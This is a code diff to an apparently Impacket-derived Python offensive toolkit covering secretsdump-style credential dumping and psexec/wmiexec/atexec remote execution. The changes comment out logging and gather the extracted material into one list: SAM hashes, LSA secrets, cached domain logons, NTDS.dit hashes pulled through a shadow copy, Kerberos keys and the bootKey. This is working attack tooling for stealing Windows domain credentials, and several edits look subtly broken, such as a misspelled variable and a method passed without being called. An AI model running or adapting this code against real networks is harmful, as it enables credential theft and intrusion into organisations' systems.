@@ -321,7 +321,7 @@ class RemoteOperations:
                 account = account[2:]
             return account
         except Exception, e:
-            logging.error(e)
+            #DEBUG logging.error(e)
             return None
 
     def __checkServiceStatus(self):
@@ -334,11 +334,11 @@ class RemoteOperations:
         # Let's check its status
         ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
         if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
-            logging.info('Service %s is in stopped state'% self.__serviceName)
+            #DEBUG logging.info('Service %s is in stopped state'% self.__serviceName)
             self.__shouldStop = True
             self.__started = False
         elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
-            logging.debug('Service %s is already running'% self.__serviceName)
+            #DEBUG logging.debug('Service %s is already running'% self.__serviceName)
             self.__shouldStop = False
             self.__started  = True
         else:
@@ -348,10 +348,10 @@ class RemoteOperations:
         if self.__started == False:
             ans = scmr.hRQueryServiceConfigW(self.__scmr,self.__serviceHandle)
             if ans['lpServiceConfig']['dwStartType'] == 0x4:
-                logging.info('Service %s is disabled, enabling it'% self.__serviceName)
+                #DEBUG logging.info('Service %s is disabled, enabling it'% self.__serviceName)
                 self.__disabled = True
                 scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x3)
-            logging.info('Starting service %s' % self.__serviceName)
+            #DEBUG logging.info('Starting service %s' % self.__serviceName)
             scmr.hRStartServiceW(self.__scmr,self.__serviceHandle)
             time.sleep(1)
 
@@ -363,10 +363,10 @@ class RemoteOperations:
     def __restore(self):
         # First of all stop the service if it was originally stopped
         if self.__shouldStop is True:
-            logging.info('Stopping service %s' % self.__serviceName)
+            #DEBUG logging.info('Stopping service %s' % self.__serviceName)
             scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
         if self.__disabled is True:
-            logging.info('Restoring the disabled state for service %s' % self.__serviceName)
+            #DEBUG logging.info('Restoring the disabled state for service %s' % self.__serviceName)
             scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x4)
         if self.__serviceDeleted is False:
             # Check again the service we created does not exist, starting a new connection
@@ -408,7 +408,7 @@ class RemoteOperations:
         ans = rrp.hOpenLocalMachine(self.__rrp)
         self.__regHandle = ans['phKey']
         for key in ['JD','Skew1','GBG','Data']:
-            logging.debug('Retrieving class info for %s'% key)
+            #DEBUG logging.debug('Retrieving class info for %s'% key)
             ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
             keyHandle = ans['phkResult']
             ans = rrp.hBaseRegQueryInfoKey(self.__rrp,keyHandle)
@@ -422,12 +422,12 @@ class RemoteOperations:
         for i in xrange(len(bootKey)):
             self.__bootKey += bootKey[transforms[i]]
 
-        logging.info('Target system bootKey: 0x%s' % self.__bootKey.encode('hex'))
+        #DEBUG logging.info('Target system bootKey: 0x%s' % self.__bootKey.encode('hex'))
 
         return self.__bootKey
 
     def checkNoLMHashPolicy(self):
-        logging.debug('Checking NoLMHash Policy')
+        #DEBUG logging.debug('Checking NoLMHash Policy')
         ans = rrp.hOpenLocalMachine(self.__rrp)
         self.__regHandle = ans['phKey']
 
@@ -439,10 +439,10 @@ class RemoteOperations:
             noLMHash = 0
 
         if noLMHash != 1:
-            logging.debug('LMHashes are being stored')
+            #DEBUG logging.debug('LMHashes are being stored')
             return False
 
-        logging.debug('LMHashes are NOT being stored')
+        #DEBUG logging.debug('LMHashes are NOT being stored')
         return True
 
     def __retrieveHive(self, hiveName):
@@ -462,11 +462,11 @@ class RemoteOperations:
         return remoteFileName
 
     def saveSAM(self):
-        logging.debug('Saving remote SAM database')
+        #DEBUG logging.debug('Saving remote SAM database')
         return self.__retrieveHive('SAM')
 
     def saveSECURITY(self):
-        logging.debug('Saving remote SECURITY database')
+        #DEBUG logging.debug('Saving remote SECURITY database')
         return self.__retrieveHive('SECURITY')
 
     def __executeRemote(self, data):
@@ -486,6 +486,7 @@ class RemoteOperations:
         scmr.hRCloseServiceHandle(self.__scmr, service)
     def __answer(self, data):
         self.__answerTMP += data
+        print(self.__answerTMP) #DEBUG4
 
     def __getLastVSS(self):
         self.__executeRemote('%COMSPEC% /C vssadmin list shadows')
@@ -527,7 +528,7 @@ class RemoteOperations:
         return lastShadow, lastShadowFor
 
     def saveNTDS(self):
-        logging.info('Searching for NTDS.dit')
+        #DEBUG logging.info('Searching for NTDS.dit')
         # First of all, let's try to read the target NTDS.dit registry entry
         ans = rrp.hOpenLocalMachine(self.__rrp)
         regHandle = ans['phKey']
@@ -549,7 +550,7 @@ class RemoteOperations:
         rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
         rrp.hBaseRegCloseKey(self.__rrp, regHandle)
 
-        logging.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % (ntdsLocation))
+        #DEBUG logging.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % (ntdsLocation))
         # Get the list of remote shadows
         shadow, shadowFor = self.__getLastVSS()
         if shadow == '' or (shadow != '' and shadowFor != ntdsDrive):
@@ -656,13 +657,14 @@ class OfflineRegistry:
             self.__registryHive.close()
 
 class SAMHashes(OfflineRegistry):
-    def __init__(self, samFile, bootKey, isRemote = False):
+    def __init__(self, samFile, bootKey, output_hashes, isRemote = False):
         OfflineRegistry.__init__(self, samFile, isRemote)
         self.__samFile = samFile
         self.__hashedBootKey = ''
         self.__bootKey = bootKey
         self.__cryptoCommon = CryptoCommon()
         self.__itemsFound = {}
+        self.output_hashes = output_hashes
 
     def MD5(self, data):
         md5 = hashlib.new('md5')
@@ -670,7 +672,7 @@ class SAMHashes(OfflineRegistry):
         return md5.digest()
 
     def getHBootKey(self):
-        logging.debug('Calculating HashedBootKey from SAM')
+        #DEBUG logging.debug('Calculating HashedBootKey from SAM')
         QWERTY = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
         DIGITS = "0123456789012345678901234567890123456789\0"
 
@@ -713,7 +715,7 @@ class SAMHashes(OfflineRegistry):
             # No SAM file provided
             return
 
-        logging.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
+        #DEBUG logging.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
         self.getHBootKey()
 
         usersKey = 'SAM\\Domains\\Account\\Users'
@@ -756,7 +758,11 @@ class SAMHashes(OfflineRegistry):
 
             answer =  "%s:%d:%s:%s:::" % (userName, rid, lmHash.encode('hex'), ntHash.encode('hex'))
             self.__itemsFound[rid] = answer
-            print answer
+            try:
+                self.output_hashes.append(answer)
+            except Exception as e:
+                print("[!] There was an error: %s") % (e)
+            #DEBUG print answer
 
     def export(self, fileName):
         if len(self.__itemsFound) > 0:
@@ -766,9 +772,12 @@ class SAMHashes(OfflineRegistry):
                 fd.write(self.__itemsFound[item]+'\n')
             fd.close()
 
+    def return_output_hashes(self):
+        return(self.output_hashes)
+
 
 class LSASecrets(OfflineRegistry):
-    def __init__(self, securityFile, bootKey, remoteOps = None, isRemote = False):
+    def __init__(self, securityFile, bootKey, output_hashes, remoteOps = None, isRemote = False):
         OfflineRegistry.__init__(self,securityFile, isRemote)
         self.__hashedBootKey = ''
         self.__bootKey = bootKey
@@ -781,6 +790,7 @@ class LSASecrets(OfflineRegistry):
         self.__remoteOps = remoteOps
         self.__cachedItems = []
         self.__secretItems = []
+        self.output_hashes = output_hashes
 
     def MD5(self, data):
         md5 = hashlib.new('md5')
@@ -862,11 +872,11 @@ class LSASecrets(OfflineRegistry):
             self.__LSAKey = plainText[0x10:0x20]
 
     def __getLSASecretKey(self):
-        logging.debug('Decrypting LSA Key')
+        #DEBUG logging.debug('Decrypting LSA Key')
         # Let's try the key post XP
         value = self.getValue('\\Policy\\PolEKList\\default')
         if value is None:
-            logging.debug('PolEKList not found, trying PolSecretEncryptionKey')
+            #DEBUG logging.debug('PolEKList not found, trying PolSecretEncryptionKey')
             # Second chance
             value = self.getValue('\\Policy\\PolSecretEncryptionKey\\default')
             self.__vistaStyle = False
@@ -877,7 +887,7 @@ class LSASecrets(OfflineRegistry):
         self.__decryptLSA(value[1])
 
     def __getNLKMSecret(self):
-        logging.debug('Decrypting NL$KM')
+        #DEBUG logging.debug('Decrypting NL$KM')
         value = self.getValue('\\Policy\\Secrets\\NL$KM\\CurrVal\\default')
         if value is None:
             raise Exception("Couldn't get NL$KM value")
@@ -899,7 +909,7 @@ class LSASecrets(OfflineRegistry):
             # No SECURITY file provided
             return
 
-        logging.info('Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)')
+        #DEBUG logging.info('Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)')
 
         # Let's first see if there are cached entries
         values = self.enumValues('\\Cache')
@@ -916,7 +926,7 @@ class LSASecrets(OfflineRegistry):
         self.__getNLKMSecret()
 
         for value in values:
-            logging.debug('Looking into %s' % value)
+            #DEBUG logging.debug('Looking into %s' % value)
             record = NL_RECORD(self.getValue(ntpath.join('\\Cache',value))[1])
             if record['CH'] != 16 * '\x00':
                 if self.__vistaStyle is True:
@@ -933,24 +943,28 @@ class LSASecrets(OfflineRegistry):
                 domainLong = plainText[:self.__pad(record['FullDomainLength'])].decode('utf-16le')
                 answer = "%s:%s:%s:%s:::" % (userName, encHash.encode('hex'), domainLong, domain)
                 self.__cachedItems.append(answer)
-                print answer
+                try:
+                    self.output_hashes.append(answer)
+                except Exception as e:
+                    print("[!] There was an error: %s") % (e)
+                #DEBUG print answer
 
     def __printSecret(self, name, secretItem):
         # Based on [MS-LSAD] section 3.1.1.4
 
         # First off, let's discard NULL secrets.
         if len(secretItem) == 0:
-            logging.debug('Discarding secret %s, NULL Data' % name)
+            #DEBUG logging.debug('Discarding secret %s, NULL Data' % name)
             return
 
         # We might have secrets with zero
         if secretItem.startswith('\x00\x00'):
-            logging.debug('Discarding secret %s, all zeros' % name)
+            #DEBUG logging.debug('Discarding secret %s, all zeros' % name)
             return
 
         upperName = name.upper()
 
-        logging.info('%s ' % name)
+        #DEBUG logging.info('%s ' % name) 
 
         secret = ''
 
@@ -1009,21 +1023,25 @@ class LSASecrets(OfflineRegistry):
                 secret = "%s\\%s$:%s:%s:::" % (domain, machine, ntlm.LMOWFv1('','').encode('hex'), md4.digest().encode('hex'))
             else:
                 secret = "$MACHINE.ACC: %s:%s" % (ntlm.LMOWFv1('','').encode('hex'), md4.digest().encode('hex'))
-
-        if secret != '':
-            print secret
-            self.__secretItems.append(secret)
-        else:
-            # Default print, hexdump
-            self.__secretItems.append('%s:%s' % (name, secretItem.encode('hex')))
-            hexdump(secretItem)
+        try:
+            if secret != '':
+                #DEBUG print secret
+                self.__secretItems.append(secret)
+                self.output_hashes.append(secret)
+            else:
+                # Default print, hexdump
+                self.__secretItems.append('%s:%s' % (name, secretItem.encode('hex')))
+                self.output_hashes.append(secret)
+                hexdump(secretItem)
+        except Exception as e:
+                print("[!] An error occurred: %s") % (e)
 
     def dumpSecrets(self):
         if self.__securityFile is None:
             # No SECURITY file provided
             return
 
-        logging.info('Dumping LSA Secrets')
+        #DEBUG logging.info('Dumping LSA Secrets')
 
         # Let's first see if there are cached entries
         keys = self.enumKey('\\Policy\\Secrets')
@@ -1040,7 +1058,7 @@ class LSASecrets(OfflineRegistry):
             self.__getLSASecretKey()
 
         for key in keys:
-            logging.debug('Looking into %s' % key)
+            #DEBUG logging.debug('Looking into %s' % key)
             value = self.getValue('\\Policy\\Secrets\\%s\\CurrVal\\default' % key)
 
             if value is not None:
@@ -1069,6 +1087,8 @@ class LSASecrets(OfflineRegistry):
                 fd.write(item+'\n')
             fd.close()
 
+    def return_output_hashes(self):
+        return(self.output_hashes)
 
 class NTDSHashes():
     NAME_TO_INTERNAL = {
@@ -1137,7 +1157,7 @@ class NTDSHashes():
             ('EncryptedHash',':'),
         )
 
-    def __init__(self, ntdsFile, bootKey, isRemote = False, history = False, noLMHash = True):
+    def __init__(self, ntdsFile, bootKey, output_hashes, isRemote = False, history = False, noLMHash = True):
         self.__bootKey = bootKey
         self.__NTDS = ntdsFile
         self.__history = history
@@ -1150,9 +1170,10 @@ class NTDSHashes():
         self.__cryptoCommon = CryptoCommon()
         self.__hashesFound = {}
         self.__kerberosKeys = collections.OrderedDict()
+        self.output_hashes = output_hashes
 
     def __getPek(self):
-        logging.info('Searching for pekList, be patient')
+        #DEBUG logging.info('Searching for pekList, be patient')
         pek = None
         while True:
             record = self.__ESEDB.getNextRow(self.__cursor)
@@ -1230,15 +1251,23 @@ class NTDSHashes():
 
                             if  self.KERBEROS_TYPE.has_key(keyDataNew['KeyType']):
                                 answer =  "%s:%s:%s" % (userName, self.KERBEROS_TYPE[keyDataNew['KeyType']],keyValue.encode('hex'))
+                                try:
+                                    self.output_hashes.append(answer)
+                                except Exception as e:
+                                    print("[!] There was an error: %s") % (e)
                             else:
                                 answer =  "%s:%s:%s" % (userName, hex(keyDataNew['KeyType']),keyValue.encode('hex'))
+                                try:
+                                    self.output_hashes.append(answer)
+                                except Exception as e:
+                                    print("[!] There was an error: %s") % (e)
                             # We're just storing the keys, not printing them, to make the output more readable
                             # This is kind of ugly... but it's what I came up with tonight to get an ordered
                             # set :P. Better ideas welcomed ;)
                             self.__kerberosKeys[answer] = None
 
     def __decryptHash(self, record):
-        logging.debug('Decrypting hash for user: %s' % record[self.NAME_TO_INTERNAL['name']])
+        #DEBUG logging.debug('Decrypting hash for user: %s' % record[self.NAME_TO_INTERNAL['name']])
 
         sid = SAMR_RPC_SID(record[self.NAME_TO_INTERNAL['objectSid']].decode('hex'))
         rid = sid.formatCanonical().split('-')[-1]
@@ -1267,7 +1296,11 @@ class NTDSHashes():
 
         answer =  "%s:%s:%s:%s:::" % (userName, rid, LMHash.encode('hex'), NTHash.encode('hex'))
         self.__hashesFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')] = answer
-        print answer
+        try:
+            self.output_hashes.append(answer)
+        except Exception as e:
+            print("[!] There was an error: %s") % (e)
+        #DEBUG print answer
 
         if self.__history:
             LMHistory = []
@@ -1296,21 +1329,27 @@ class NTDSHashes():
 
                 answer =  "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, NTHash.encode('hex'))
                 self.__hashesFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')+str(i)] = answer
-                print answer
+                try:
+                    self.output_hashes.append(answer)
+                except Exception as e:
+                    print("[!] There was an error: %s") % (e)
+                #DEBUG print answer
 
 
     def dump(self):
         if self.__NTDS is None:
             # No NTDS.dit file provided
             return
-        logging.info('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
+        #DEBUG logging.info('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
         # We start getting rows from the table aiming at reaching
         # the pekList. If we find users records we stored them
         # in a temp list for later process.
         self.__getPek()
         if self.__PEK is not None:
-            logging.info('Pek found and decrypted: 0x%s' % self.__PEK.encode('hex'))
-            logging.info('Reading and decrypting hashes from %s ' % self.__NTDS)
+            #DEBUG logging.info('Pek found and decrypted: 0x%s' % self.__PEK.encode('hex'))
+            #DEBUG logging.info('Reading and decrypting hashes from %s ' % self.__NTDS)
+            print("0x%s") % self.__PEK.encode('hex')
+            print(self.NTDS)
             # First of all, if we have users already cached, let's decrypt their hashes
             for record in self.__tmpUsers:
                 try:
@@ -1318,14 +1357,14 @@ class NTDSHashes():
                     self.__decryptSupplementalInfo(record)
                 except Exception, e:
                     #import traceback
-                    #print traceback.print_exc()
+                    #print traceback.print_exc() #DEBUG3
                     try:
-                        logging.error("Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
-                        logging.error(str(e))
+                        #DEBUG logging.error("Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
+                        #DEBUG logging.error(str(e))
                         pass
                     except:
-                        logging.error("Error while processing row!")
-                        logging.error(str(e))
+                        #DEBUG logging.error("Error while processing row!")
+                        #DEBUG logging.error(str(e))
                         pass
 
             # Now let's keep moving through the NTDS file and decrypting what we find
@@ -1333,9 +1372,8 @@ class NTDSHashes():
                 try:
                     record = self.__ESEDB.getNextRow(self.__cursor)
                 except:
-                    logging.error('Error while calling getNextRow(), trying the next one')
+                    #DEBUG logging.error('Error while calling getNextRow(), trying the next one')
                     continue
-
                 if record is None:
                     break
                 try:
@@ -1346,18 +1384,23 @@ class NTDSHashes():
                     #import traceback
                     #print traceback.print_exc()
                     try:
-                        logging.error("Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
-                        logging.error(str(e))
+                        #DEBUG logging.error("Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
+                        #DEBUG logging.error(str(e))
                         pass
                     except:
-                        logging.error("Error while processing row!")
-                        logging.error(str(e))
+                        #DEBUG logging.error("Error while processing row!")
+                        #DEBUG logging.error(str(e))
                         pass
         # Now we'll print the Kerberos keys. So we don't mix things up in the output.
         if len(self.__kerberosKeys) > 0:
-            logging.info('Kerberos keys from %s ' % self.__NTDS)
+            #DEBUG logging.info('Kerberos keys from %s ' % self.__NTDS)
+            self.output_hashes.append(self.__NTDS) #DEBUG
             for itemKey in self.__kerberosKeys.keys():
-                print itemKey
+                #DEBUG print itemKey
+                try:
+                    self.output_hashes.append(itemKey) #KERBEROS KEYS
+                except Exception as e:
+                    print("[!] An error occurred: %s") % (e) #DEBUG
 
     def export(self, fileName):
         if len(self.__hashesFound) > 0:
@@ -1367,10 +1410,11 @@ class NTDSHashes():
                 try:
                     fd.write(self.__hashesFound[item]+'\n')
                 except Exception, e:
-                    try:
+                    '''DEBUG try:
                         logging.error("Error writing entry %d, skipping" % item)
                     except:
                         logging.error("Error writing entry, skipping")
+                    '''
                     pass
             fd.close()
         if len(self.__kerberosKeys) > 0:
@@ -1382,6 +1426,9 @@ class NTDSHashes():
     def finish(self):
         if self.__NTDS is not None:
             self.__ESEDB.close()
+    
+    def return_output_hashes(self):
+        return(self.output_hashes)
 
 
 class DumpSecrets:
@@ -1407,6 +1454,7 @@ class DumpSecrets:
         self.__isRemote = True
         self.__outputFileName = outputFileName
         self.__doKerberos = doKerberos
+        self.output_hashes = []
 
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
@@ -1427,7 +1475,7 @@ class DumpSecrets:
         currentControlSet = winreg.getValue('\\Select\\Current')[1]
         currentControlSet = "ControlSet%03d" % currentControlSet
         for key in ['JD','Skew1','GBG','Data']:
-            logging.debug('Retrieving class info for %s'% key)
+            #DEBUG logging.debug('Retrieving class info for %s'% key)
             ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet,key))
             digit = ans[:16].decode('utf-16le')
             tmpKey = tmpKey + digit
@@ -1439,11 +1487,17 @@ class DumpSecrets:
         for i in xrange(len(tmpKey)):
             bootKey += tmpKey[transforms[i]]
 
-        logging.info('Target system bootKey: 0x%s' % bootKey.encode('hex'))
+        #DEBUG logging.info('Target system bootKey: 0x%s' % bootKey.encode('hex'))
+        try:
+            bootkeyinfo = ""
+            bootkeyinfo = "bootkey 0x" + bootKey.encode('hex')
+            self.output_hashes.append(bootkeyinfo) #DEBUG
+        except Exception as e:
+            print("[!] There was an error: %s") % (e)
         return bootKey
 
     def checkNoLMHashPolicy(self):
-        logging.debug('Checking NoLMHash Policy')
+        #DEBUG logging.debug('Checking NoLMHash Policy')
         winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
         # We gotta find out the Current Control Set
         currentControlSet = winreg.getValue('\\Select\\Current')[1]
@@ -1457,9 +1511,9 @@ class DumpSecrets:
             noLmHash = 0
 
         if noLmHash != 1:
-            logging.debug('LMHashes are being stored')
+            #DEBUG logging.debug('LMHashes are being stored')
             return False
-        logging.debug('LMHashes are NOT being stored')
+        #DEBUG logging.debug('LMHashes are NOT being stored')
         return True
 
     def dump(self):
@@ -1483,9 +1537,12 @@ class DumpSecrets:
                     SAMFileName = self.__remoteOps.saveSAM()
                 else:
                     SAMFileName = self.__samHive
-
-                self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
-                self.__SAMHashes.dump()
+                try:
+                    self.__SAMHashes = SAMHashes(SAMFileName, bootKey, self.output_hashes, isRemote = self.__isRemote)
+                    self.__SAMHashes.dump()
+                    self.output_hashes.extend(self.__SAMHashes.return_output_hashes())
+                except Exception as e:
+                    print("[!] An error has occurred: %s") % (e)
                 if self.__outputFileName is not None:
                     self.__SAMHashes.export(self.__outputFileName)
 
@@ -1493,12 +1550,16 @@ class DumpSecrets:
                     SECURITYFileName = self.__remoteOps.saveSECURITY()
                 else:
                     SECURITYFileName = self.__securityHive
-
-                self.__LSASecrets= LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isRemote = self.__isRemote)
-                self.__LSASecrets.dumpCachedHashes()
+                try:
+                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.output_hashes, self.__remoteOps, isRemote = self.__isRemote)
+                    self.__LSASecrets.dumpCachedHashes()
+                    self.output_hashes.extend(self.__LSASecrets.return_output_hashes())
+                except Exception as e:
+                    print("[!] There was an error: %s") % (e)
                 if self.__outputFileName is not None:
                     self.__LSASecrets.exportCached(self.__outputFileName)
                 self.__LSASecrets.dumpSecrets()
+                self.output_hashes.extend(self.__SAMHashes.return_output_hashes)
                 if self.__outputFileName is not None:
                     self.__LSASecrets.exportSecrets(self.__outputFileName)
 
@@ -1506,22 +1567,28 @@ class DumpSecrets:
                     NTDSFileName = self.__remoteOps.saveNTDS()
                 else:
                     NTDSFileName = self.__ntdsFile
-
-                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote = self.__isRemote, history = self.__history, noLMHash = self.__noLMHash)
-                self.__NTDSHashes.dump()
-
+                try:
+                    self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, self.output_hashes, isRemote = self.__isRemote, history = self.__history, noLMHash = self.__noLMHash)
+                    self.__NTDSHashes.dump()
+                    self.output_hashes.extend(self.__NTDSHashes.return_output_hashes())
+                except Exception as e:
+                    print("[!] There was an error: %s") % (e)
                 if self.__outputFileName is not None:
                     self.__NTDSHashes.export(self.__outputFileName)
-
                 self.cleanup()
             except (Exception, KeyboardInterrupt), e:
                 #import traceback
                 #print traceback.print_exc()
-                logging.error(e)
+                #DEBUG logging.error(e)
                 try:
                     self.cleanup()
                 except:
                     pass
+    
+    def return_output_hashes(self):
+        set = sets.Set(self.output_hashes)
+        output_hashes = list(set)
+        return(output_hashes)
 
     def cleanup(self):
         logging.info('Cleaning up... ')
@@ -2472,7 +2539,8 @@ class PSEXEC:
                 if self.__copyFile is not None:
                     s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
             sys.stdout.flush()
-            sys.exit(1)
+            #sys.exit(1) #DEBUG PSEXEC
+            return
 
 class Pipes(Thread):
     def __init__(self, transport, pipe, permissions, share=None):
@@ -3375,6 +3443,7 @@ METHOD FUNCTIONS
 
 def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat, st, creds_dict):
     message = ""
+    message_list = []
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3398,7 +3467,7 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
                 shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = command, proto = protocol)
                 shell.play(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
+                message_list, creds_dict = output_handler(command, logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3417,7 +3486,7 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
                 shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = unprotected_command, proto = protocol)
                 shell.play(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
+                message_list, creds_dict = output_handler(command, logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3435,7 +3504,7 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
                 shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = unprotected_command, proto = protocol)
                 shell.play(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
+                message_list, creds_dict = output_handler(command, logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3468,6 +3537,7 @@ def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
         else:
             print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
         return
+    return
 
 def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict):
     message = ""
@@ -3496,6 +3566,7 @@ def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
 
 def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat, st, creds_dict):
     message = ""
+    messsage_list = []
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3514,7 +3585,7 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
+                message_list, creds_dict = output_handler(command, logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3534,7 +3605,7 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
+                message_list, creds_dict = output_handler(command, logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3554,7 +3625,7 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
+                message_list, creds_dict = output_handler(command, logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3574,7 +3645,7 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
+                message_list, creds_dict = output_handler(command, logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3584,7 +3655,7 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 return # changed from continue inside a function
     return(creds_dict)
 
-def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict): 
+def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict, command): 
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3602,7 +3673,7 @@ def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods
         shell = USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
         shell.run()
         data = shell.return_data()
-        message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
+        message_list, creds_dict = output_handler(command, logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
     except (Exception, KeyboardInterrupt), e:
         print("[!] An error occurred: %s") % (e)
         if hash:
@@ -3611,7 +3682,7 @@ def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods
